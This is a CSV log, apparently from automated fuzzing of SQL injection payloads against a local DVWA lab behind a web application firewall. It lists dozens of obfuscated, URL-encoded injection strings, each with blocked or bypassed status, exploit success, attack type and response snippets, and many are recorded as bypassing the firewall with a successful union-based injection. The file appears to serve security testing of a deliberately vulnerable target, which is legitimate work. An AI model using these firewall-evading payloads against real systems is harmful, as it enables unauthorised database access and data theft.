Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@!=1+||+not+{x+(select+1)}=1=%0b(!+{x%0b(select+1)}=1)+or%27,Blocked,No,None,Unknown,0.0074,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+||%0b{`if`+1}=1+like+{a+1}=1%0bor',Bypassed,No,None,Unknown,0.0258,72.88,No,500,
0%27<@!=1.%0b||%0bnot+{a%0b1}=1=%0b(not%0b{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0187,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+!+{a+1}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0193,72.88,No,500,
0%27<@!=.1%0b||%0bnot%7efalse=%0b(not%7efalse)%0b||',Bypassed,No,None,Unknown,0.0423,72.88,No,500,
0'<@=1+||%0bnot+{a+1}=1=+(not+{x%0b(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0252,72.88,No,500,
0'<@!=1.+or%0bnot%0b{a%0b1}=1=+(not%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0227,72.88,No,500,
0%27or+@<@%0b||+!%0b{x%0b(select+1)}=1=+(!+{`if`+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0142,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or+not+{x+(select+1)}=1=+(not+{a+1}=1)%0bor',Blocked,No,None,Unknown,0.0148,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+not%0b{a%0b1}=1=+(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0305,72.88,No,500,
0'<@=1+||+not%0b{`if`%0b1}=1=+(!+1)--%0b,Bypassed,No,None,piggyAtk,0.014,72.88,No,500,
0%27<@=1.+||+not%0b1=+(not+{x+(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0136,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||%0bnot%0b1=+(!%0b{a%0b1}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0195,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+!%0b{x+(select+1)}=1=+(not+{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0279,72.88,No,500,
0%27||+!@<@.%0bor+not+{x+(select+1)}=1=+(!+{a%0b1}=1)%0b||',Blocked,No,None,Unknown,0.0344,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor+!%0b{`if`%0b1}=1=+(0)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0311,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor%0bnot%0b{a%0b1}=1=+(not%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0314,72.98,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+not+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0237,73.08,No,500,
0'<@!=.1%0bor+not+{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0273,73.08,No,500,
0%27||%0b1<@.%0bor%0b{`if`+1}=1+like%0b{x%0b(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0218,73.08,No,500,
0'<@!=1+or+!%7efalse=+(not+{x%0b(select+1)}=1)%0b||%27,Bypassed,No,None,booleanAtk,0.0288,73.08,No,500,
0'<@!=1+or+!+{x%0b(select+1)}=1=+(!+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0087,73.08,No,500,
0'<@!=1+||%0bnot%0b{a+1}=1=%0b(not+1)%0b||',Bypassed,No,None,Unknown,0.0116,73.08,No,500,
0%27<@=.1+or%0b!+{`if`%0b1}=1=%0b(not+{x%0b(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0268,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+not%0b{a%0b1}=1=%0b(not%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0208,73.08,No,500,
0%27<@=1%0bor+!%0b{x%0b(select%0b1)}=1=%0b(!%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0193,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0241,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+false=+(!~false)+or',Bypassed,No,None,booleanAtk,0.0122,73.08,No,500,
0%27<@!=1.%0b||+!+{a+1}=1=+(not%0b{a%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0142,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'||+@<@+or%0b!%0b{x+(select+1)}=1=%0b(!%0b{a+1}=1)%0b||%27,Blocked,No,None,Unknown,0.0171,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'or+@<@.%0b||%0bnot+{`if`%0b1}=1=%0b(not~false)+||',Bypassed,No,None,booleanAtk,0.0139,73.08,No,500,
0%27<@=1.+||%0b!%0b{x+(select+1)}=1=+(0)%0b||%27,Blocked,No,None,Unknown,0.0081,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+||+!+{x+(select%0b1)}=1=%0b(!~0)%0bor%27,Blocked,No,None,Unknown,0.0193,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||+!%0b{`if`+1}=1=+(not%0b{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0112,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||%0bnot%7e0=%0b(!+{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0292,73.08,No,500,
0'<@=.1%0b||+false=+(!~0)+||',Bypassed,No,None,Unknown,0.0109,73.08,No,500,
0%27<@!=.1+or+not~false=+(!+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0164,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!+{x+(select%0b1)}=1=+(!+{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0247,73.08,No,500,
0'<@=1%0bor+not~false=+(not+1)+or%27,Bypassed,No,None,booleanAtk,0.0161,73.08,No,500,
0%27<@!=1+or%0b!%0btrue=+(!+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0334,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor%0bnot%7efalse=+(not+{x%0b(select+1)}=1)%0b||%27,Bypassed,No,None,booleanAtk,0.0148,73.08,No,500,
0'<@!=1+or+!%0b{x%0b(select+1)}=1=%0b(!%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0268,73.08,No,500,
0%27<@=1+or+0=+(!%7efalse)+||',Bypassed,No,None,booleanAtk,0.0273,73.08,No,500,
0%27<@=1.+or+not%0b{a+1}=1=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0151,73.08,No,500,
0%27<@=1.+or+!+{x%0b(select+1)}=1=+(!+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0322,72.75,No,500,
0%27<@=1.+or+not%0b{x+(select%0b1)}=1=+(!%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0304,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!%0b{`if`%0b1}=1=%0b(!+1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0276,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||+not+{`if`%0b1}=1=+(not%0b{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0123,72.88,No,500,
0%27<@=1.%0bor+not+{`if`+1}=1=%0b(!~0)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0296,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+!%0b{x+(select%0b1)}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0255,72.88,No,500,
0%27<@=.1%0b||%0b%7e+{a%0b1}=1=+(%7e%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.018,72.88,No,500,
0%27<@=1%0bor+not+{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0198,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+not+{x+(select+1)}=1=%0b(!%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0289,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+!%0b1=%0b(not%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0217,72.88,No,500,
0'||%0b@<@.%0bor+!+{a%0b1}=1=+(!%0b1)%0b||%27,Bypassed,No,None,Unknown,0.0252,72.88,No,500,
0%27<@=1%0bor+{x+(select+1)}=1+like+{a%0b1}=1%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0126,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor+not%0b1=+(not%0b{x%0b(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0275,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!%0b{x+(select+1)}=1=+(!%7efalse)+||',Bypassed,No,None,Unknown,0.0295,72.88,No,500,
0'<@=1%0bor%0bnot+1=%0b(!+{`if`%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0187,72.88,No,500,
0'<@!=.1+||+!+{x%0b(select+1)}=1=%0b(not+{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.0278,72.88,No,500,
0%27<@!=1.+||+not%7efalse%0bis%0bfalse+||',Bypassed,No,None,Unknown,0.0292,72.88,No,500,
0'<@!=1+or%0b!%0b{x+(select+1)}=1=+(!+1)+or%27,Blocked,No,None,Unknown,0.079,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+not+{a+1}=1=%0b(!+{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0271,72.98,No,500,
0'<@!=1+or+!+{a%0b1}=1=%0b(!%0b{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0151,73.08,No,500,
0'<@=.1+||+!%0btrue=+(!%0b{a%0b1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0155,73.08,No,500,
0'<@!=.1%0bor+!%0b{x+(select+1)}=1=%0b(!+{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0214,73.08,No,500,
0'<@=1%0b||+!+{x+(select%0b1)}=1=%0b(!%0b{a%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0458,73.08,No,500,
0'<@=1.%0bor%0b{x+(select+1)}=1%0blike%0b{x+(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0331,73.08,No,500,
0%27<@!=1.+or%0b!+{x+(select+1)}=1=%0b(!+{x+(select%0b1)}=1)--+,Blocked,No,None,piggyAtk,0.022,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor%0b!+{a+1}=1=+(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.015,73.08,No,500,
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=+(false)%0b||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0163,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or+not+{a+1}=1=+(!+{x+(select+1)}=1)+||',Blocked,No,None,Unknown,0.0161,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+or%0bnot+{a+1}=1=%0b(!%0b1)%23,Bypassed,No,None,piggyAtk,0.03,73.08,No,500,
0%27<@!=.1+or+!%0b{`if`%0b1}=1=+(!~0)%0bor',Bypassed,No,None,Unknown,0.0176,73.08,No,500,
0%27<@=1.+||%0b!+1=%0b(not%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.029,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+{a+1}=1=+(not%0b{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0175,73.08,No,500,
0%27<@=.1+or+not+{`if`+1}=1=+(!+{a%0b1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0101,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bnot+{x+(select%0b1)}=1=%0b(!%7efalse)+or',Blocked,No,None,booleanAtk,0.0126,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor+!+1=%0b(!%7efalse)%0bor%27,Bypassed,No,None,booleanAtk,0.0157,73.08,No,500,
0%27<@=1+or+not%0b{`if`+1}=1=+(not+{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0139,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+!+{x+(select%0b1)}=1=%0b(not+{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0197,73.08,No,500,
0'<@!=1.%0b||%0b!+{x%0b(select%0b1)}=1=+(not%0b{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0123,73.08,No,500,
0%27<@!=.1+or%0b!%0b{x+(select+1)}=1=%0b(not+{a+1}=1)+||%27,Blocked,No,None,Unknown,0.0174,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+not%0b{`if`%0b1}=1=+(not~0)%0b||%27,Bypassed,No,None,Unknown,0.0481,73.08,No,500,
0'<@=1+or%0b!%0btrue=%0b(not+{`if`+1}=1)+or',Blocked,No,None,booleanAtk,0.0123,73.08,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor%0bfalse=+(!+{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0248,73.08,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
